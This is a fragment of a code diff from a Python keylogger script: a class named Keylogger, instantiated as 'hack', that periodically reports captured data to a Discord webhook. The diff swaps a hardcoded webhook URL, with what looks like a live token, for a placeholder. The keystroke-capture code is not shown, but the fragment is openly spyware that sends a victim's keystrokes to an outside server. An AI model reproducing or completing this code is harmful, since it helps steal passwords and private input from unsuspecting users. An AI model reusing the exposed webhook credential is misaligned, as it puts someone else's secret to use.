@@ -47,7 +47,7 @@ class Keylogger:
             self.report()
             listener.join()
 
-webhook_url = "https://discordapp.com/api/webhooks/1120195964687351879/7r7W8Ag-F0z_9ahdw7GBMIGJFdy1J6XevK5ID1Uyeth85pahDnwJjbHG-8qxsZdiFmZ5"
+webhook_url = "your webhook url here"
 hack = Keylogger(20, webhook_url)
 
 hack.start()
